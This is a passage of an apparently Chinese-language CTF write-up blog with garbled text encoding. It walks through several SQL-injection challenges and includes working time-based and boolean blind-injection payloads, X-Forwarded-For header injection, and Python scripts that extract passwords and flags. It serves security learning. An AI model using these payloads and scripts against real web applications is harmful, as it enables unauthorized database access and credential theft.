string">'admin'</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>æ³¨å‡ºflag</p><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><h3 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h3><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210354938.png" alt loading="lazy"></p><p><strong>F12</strong>å¯ä»¥çœ‹åˆ°<strong>hint</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210443551.png" alt loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œéœ€è¦usernameåŒ¹é…adminï¼Œéšåæ‰å¯ä»¥è¾“å…¥å¯†ç ï¼Œå…ˆåœ¨<strong>password</strong>å¤„<strong>fuzz</strong>ä¸€ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210743129.png" alt loading="lazy"></p><p>è¿‡æ»¤äº†å•å¼•å·ï¼Œå¦‚æœpasswordä¸­è¦ç”¨å•å¼•å·é—­åˆçš„è¯æ˜¾ç„¶å¾ˆéš¾è¿™é‡Œå°±éœ€è¦ä»usernameå…¥æ‰‹ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒä¸Šé¢çš„<code>BJDCTF-2ndâ€”ç®€å•æ³¨å…¥</code>ï¼Œå’Œpç¥å’ŒSmi1eå¸ˆå‚…çš„æ–‡ç« ï¼š</p><ul><li><a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">[å°å¯†åœˆ]ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢å­¦ä¹ </a></li><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢</a></li></ul><p>è¿™é‡Œç›´æ¥ç»™å‡ºpayloadï¼š<code>username=admin%0a\&amp;password=/**/or/**/if(left((password),1)REGEXP/**/binary/**/&quot;I&quot;,sleep(3),1)#</code></p><p>expå¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">import requestsurl <span class="token operator">=</span> <span class="token string double-quoted-string">"https://bbafd3a8-7f89-4adf-84c2-7028b93775cc.chall.ctf.show/"</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string double-quoted-string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"Accept"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>str1 <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>passwd <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j in str1<span class="token punctuation">:</span>        exp <span class="token operator">=</span> passwd <span class="token operator">+</span> j        payload <span class="token operator">=</span> <span class="token string single-quoted-string">'/**/or/**/if(left((password),&#123;&#125;)REGEXP/**/binary/**/"^&#123;&#125;",sleep(3),1)#'</span><span class="token operator">.</span><span class="token function">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> exp<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string single-quoted-string">'username'</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'admin%0a\\'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'password'</span><span class="token punctuation">:</span> payload        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token operator">.</span>elapsed<span class="token operator">.</span><span class="token function">total_seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>            passwd <span class="token operator">=</span> passwd <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>è¿™é‡Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li><code>binary</code>åŒ¹é…å¤§å°å†™</li><li><code>mid</code>å’Œ<code>substr</code>è¢«è¿‡æ»¤äº†ç”¨<code>left</code></li><li>ç©ºæ ¼ç”¨<code>/**/</code></li></ul><p>éšåå°±å¯ä»¥è·‘å‡ºå¯†ç ç™»å½•å³å¯å¾—åˆ°<code>flag</code></p><h3 id="XCTFâ€”INSERT-INTOæ³¨å…¥"><a href="#XCTFâ€”INSERT-INTOæ³¨å…¥" class="headerlink" title="XCTFâ€”INSERT INTOæ³¨å…¥"></a>XCTFâ€”INSERT INTOæ³¨å…¥</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“substr(),x-forwarded-forå¤´æ³¨å…¥</p><p>å¹³å°ï¼š[bugku INSERT INTOæ³¨å…¥](<a href="https://ctf.bugku.com/challenges#INSERT">https://ctf.bugku.com/challenges#INSERT</a> INTOæ³¨å…¥)é¢˜ç›®é“¾æ¥ï¼š<a href="http://123.206.87.240:8002/web15/">http://123.206.87.240:8002/web15/</a></p><p>åœ¨é¢˜ç›®çš„ä¸‹æ–¹ç»™äº†æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">flagæ ¼å¼ï¼šflag<span class="token punctuation">&#123;</span>xxxxxxxxxxxx<span class="token punctuation">&#125;</span>ä¸å¦‚å†™ä¸ªPythonå§<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ip_arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$ip_arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$db</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$connect</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to select database"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'your ip is :'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into client_ip (ip) values ('<span class="token interpolation"><span class="token variable">$ip</span></span>')"</span><span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>é€šè¿‡è§‚å¯Ÿä»£ç å¯ä»¥å‘ç°å˜é‡<code>$ip</code>å¯ä»¥é€šè¿‡æ›´æ”¹<code>X-Forwarded-For</code>å¤´è¿›è¡Œæ›´æ”¹ï¼Œä¸”åé¢çš„ä»£ç æŠŠæ¯ä¸€æ¬¡æŸ¥è¯¢çš„ipéƒ½æ’å…¥çš„æ•°æ®åº“ï¼Œæ¨æµ‹<code>$ip</code>å¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œäºæ˜¯burpæŠ“åŒ…åˆ¤æ–­æ³¨å…¥ç‚¹ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/OZAFpjoRIb1Wyig.png" style="zoom: 50%;" loading="lazy"><p>åˆ©ç”¨å»¶æ—¶æ³¨å…¥éªŒè¯æ­¤å¤„ç¡®å®å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œäºæ˜¯å¼€å§‹æ„é€ æ³¨å…¥å‡½æ•°ï¼Œä»£ç <code>$ip_arr = explode(&#39;,&#39;, $ip);</code>é€šè¿‡é€—å·å°†ipåˆ†ç¦»å¼€ï¼Œåªå–ç¬¬ä¸€ä¸ªï¼Œæ‰€ä»¥è¿™é‡Œç›¸å½“äºè¿‡è¿‡æ»¤äº†é€—å·æ³¨å…¥ç¬¦å·ï¼Œäºæ˜¯æˆ‘ä»¬é€šå¸¸ç”¨çš„<code>mid</code>ã€<code>substr</code>ï¼Œ<code>if</code>åˆ¤æ–­åœ¨è¿™é‡Œç”¨ä¸äº†äº†ï¼Œåœ¨è¿™é‡Œç”¨ä»¥ä¸‹æ³¨å…¥æ–¹æ³•æ›¿æ¢ï¼š</p><p><code>if(sql,num,str)</code>å¯æ›¿æ¢æˆ<code>case when sql then sleep(5) else 1 end</code></p><p><code>sql</code>æ³¨å…¥è¯­å¥ä¸­çš„<code>substr</code>è¯­å¥å¯ä»¥å†™æˆï¼š<code>substr(sql from num for 1) = str</code>ï¼Œå°†è¯­å¥ä¸­çš„é€—å·æ›¿æ¢æˆäº†<code>from</code>å’Œ<code>for</code>ï¼Œè¯­å¥ç…§å¸¸è¿›è¡Œï¼Œ<code>mid</code>å‡½æ•°ä¹Ÿå¯ä»¥è¿™æ ·</p><p>Payload1ï¼š<code>127.0.0.1&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>ï¼Œå¾—åˆ°è¡¨<code>client_ip</code>,<code>flag</code></p><p>Payload2ï¼š<code>127.0.0.1&#39;and (case when (substr((select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag&#39;) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>ï¼Œå¾—åˆ°è¡¨<code>flag</code>ä¸­çš„<code>flag</code>åˆ—</p><p>Payload3ï¼š<code>127.0.0.1&#39;and (case when (substr((select group_concat(flag) from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>ï¼Œå¾—åˆ°<code>flag</code>åˆ—ä¸­çš„<code>flag</code></p><p>pythonè„šæœ¬å¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.-"</span>url <span class="token operator">=</span> <span class="token string">"http://123.206.87.240:8002/web15/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token string">"æ­¤å¤„ä¸ºPayload"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        header <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"x-forwarded-for"</span><span class="token punctuation">:</span>data<span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h3 id="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”ç›²æ³¨"><a href="#2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”ç›²æ³¨" class="headerlink" title="2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”ç›²æ³¨"></a>2020ichunqiuæ–°æ˜¥å…¬ç›Šèµ›â€”ç›²æ³¨</h3><p>é¦–å…ˆç‚¹è¿›å»çš„ç•Œé¢ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment"># flagåœ¨fl4gé‡Œ</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'waf.php'</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check_sql</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from flllllllag where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>            <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å¯ä»¥çœ‹åˆ°éœ€è¦æˆ‘ä»¬getä¸€ä¸ªidå‚æ•°æ¥ç»•è¿‡wafé‡Œçš„check_sqlå‡½æ•°å®Œæˆæ³¨å…¥ï¼Œå¹¶ä¸”<code>flag</code>åœ¨<code>fl4g</code>é‡Œ</p><p>é¦–å…ˆé¢˜ç›®è¿‡æ»¤äº†selectï¼Œfuzzåå‘ç°ä»¥ä¸‹å­—ç¬¦å’Œå‡½æ•°è¢«è¿‡æ»¤</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/gKbs6mkaDcpUx5W.png" style="zoom: 80%;" loading="lazy"><p>å‘ç°<code>sleep</code>å‡½æ•°å¹¶æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œäºæ˜¯æƒ³åˆ°å»¶æ—¶æ³¨å…¥ï¼Œ<code>=</code>ã€<code>like</code>ã€<code>rlike</code>è¢«è¿‡æ»¤ç”¨<code>regexp</code>å‡½æ•°ä»£æ›¿</p><p>regexpåæ‰€è·Ÿçš„ä¸œè¥¿ä½œä¸ºæ­£åˆ™è¡¨è¾¾å¼å¤„ç†ã€‚</p><p>Payloadï¼š<code>id=1 and if(ascii(mid(fl4g,1,1))regexp 102,sleep(3),1)</code></p><p>äºæ˜¯å†™å‡ºç›²æ³¨æ³¨å…¥è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://c6a55177986a42829935671bc7988fbd1a2652564f754cac.changame.ichunqiu.com/?id="</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> j<span class="token operator">&lt;</span><span class="token number">58</span> <span class="token keyword">or</span> j<span class="token operator">></span><span class="token number">96</span><span class="token punctuation">:</span>        <span class="token comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>            d <span class="token operator">=</span> <span class="token string">"1 and if(ascii(mid(fl4g,"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",1))regexp "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",sleep(3),1)"</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>            <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token keyword">break</span></code></pre><h3 id="ç½‘é¼æ¯2018â€”Unfinish"><a href="#ç½‘é¼æ¯2018â€”Unfinish" class="headerlink" title="ç½‘é¼æ¯2018â€”Unfinish"></a>ç½‘é¼æ¯2018â€”Unfinish</h3><p>ç™»å½•ç”¨çš„é‚®ç®±å’Œå¯†ç ï¼Œæ³¨å†Œå¯ä»¥æ³¨å†Œé‚®ç®±è´¦å·å’Œå¯†ç ï¼Œå¹¶ä¸”åœ¨ç™»å½•åçš„index.phpå¤„æœ‰æ˜¾ç¤ºæ³¨å†Œçš„ç”¨æˆ·åï¼Œç”¨æˆ·åå­˜å…¥äº†æ•°æ®åº“ï¼Œäºæ˜¯æ¨æµ‹åœ¨register.phpå¤„å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•åå‘ç°è¿‡æ»¤äº†é€—å·å’Œinformationï¼Œä¸è¿‡å¯ä»¥ç”¨fromå’Œforä»£æ›¿ï¼Œpayloadï¼š<code>0&#39; or (case when (substr((select * from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end) or &#39;1</code>ï¼Œæ³¨æ„è¿™é‡Œåˆ¤æ–­å“åº”æ—¶é—´çš„æ—¶å€™è¦ç”¨timeåº“ï¼Œå¹³å¸¸ç”¨çš„<code>elapsed.total_seconds()</code>åœ¨è¿™é‡Œå¥½åƒä¸ç®¡ç”¨ï¼Œæµ‹è¯•åå‘ç°è¿™ä¸ªå‡½æ•°è·å¾—çš„æ˜¯æœ€åä¸€æ¬¡è¯·æ±‚çš„å“åº”æ—¶é—´ï¼Œè€Œé¢˜ç›®ä¸­çš„register.phpæ³¨å†ŒæˆåŠŸä¼šé‡å®šå‘åˆ°login.phpï¼Œäºæ˜¯ä¼šå¯¼è‡´ç»“æœè¾“å‡ºä¸å‡ºæ¥ï¼Œäºæ˜¯æ”¹ç”¨timeåº“</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,&#123;&#125;_!@#$%^&amp;*.-"</span>url <span class="token operator">=</span> <span class="token string">"http://221e6a91-2118-48a2-832a-a910da7b4e1b.node3.buuoj.cn/register.php"</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span>    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"0' or (case when (substr((select * from flag) from &#123;&#125; for 1 )='&#123;&#125;') then sleep(3) else 1 end) or '1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"111@111"</span><span class="token punctuation">,</span>            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"aaa"</span>        <span class="token punctuation">&#125;</span>        startTime<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token comment">#print(r.status_code)</span>        <span class="token comment">#print(r.text)</span>        <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>startTime<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><h3 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h3><p><code>X-Forwarded-For</code>å¤´æ³¨å…¥ï¼Œ</p><p>åœ¨ä¼ å…¥urlä¸ºæ‰¾åˆ°å¯ç–‘ç‚¹ï¼ŒF12æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°htmlé¡µé¢æœ‰æ³¨é‡Šæ˜¾ç¤ºç€è®¿é—®çš„å®¢æˆ·ç«¯<code>Ip</code>ï¼Œæ¨æµ‹åç«¯å°†å®¢æˆ·ç«¯çš„<code>Ip</code>åœ°å€è®°å½•åˆ°æ•°æ®åº“å½“ä¸­ã€‚å°è¯•æ”¹å†™XFFå¤´å‘ç°ipå¯æ§ï¼Œæ¨æµ‹ä¸ºXFFå¤´æ³¨å…¥ï¼Œäºæ˜¯å°è¯•sqlæ³¨å…¥ï¼Œæµ‹è¯•åå‘ç°ï¼ŒXFFæ³¨å…¥è¯·æ±‚ä¸€æ¬¡åï¼Œå†è¯·æ±‚ä¸¤æ¬¡æ­£å¸¸XFFçš„ipï¼Œå³å¯è§¦å‘XFFçš„sqlæ³¨å…¥ï¼Œæ¨æµ‹åç«¯ä»£ç ï¼Œç¬¬äºŒæ¬¡å¹¶æœªç›´æ¥ä»æ•°æ®åº“ä¸­è¯·æ±‚æ•°æ®ï¼Œç”±äºç¬¬äºŒæ¬¡è¯·æ±‚çš„ipä¸ä¸€æ ·ï¼ŒæœåŠ¡å™¨ä¼šç›´æ¥å°†ä¸Šæ¬¡çš„ipæ˜¾ç¤ºå‡ºæ¥ï¼Œåœ¨ç¬¬ä¸‰æ¬¡è¯·æ±‚å’Œç¬¬äºŒæ¬¡ä¸€æ ·çš„ipçš„æ—¶ï¼ŒæœåŠ¡å™¨å°±ä¼šä»æ•°æ®åº“ä¸­æŸ¥æ‰¾<code>last ip</code>ï¼Œå³å¯è§¦å‘sqlæ³¨å…¥</p><p>expï¼ˆglzjin yydsï¼‰ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> requeststarget <span class="token operator">=</span> <span class="token string">"http://node3.buuoj.cn:27167/"</span><span class="token keyword">def</span> <span class="token function">execute_sql</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]è¯·æ±‚è¯­å¥ï¼š"</span> <span class="token operator">+</span> sql<span class="token punctuation">)</span>    return_result <span class="token operator">=</span> <span class="token string">""</span>    payload <span class="token operator">=</span> <span class="token string">"0'|length(("</span> <span class="token operator">+</span> sql <span class="token operator">+</span> <span class="token string">"))|'0"</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> session<span 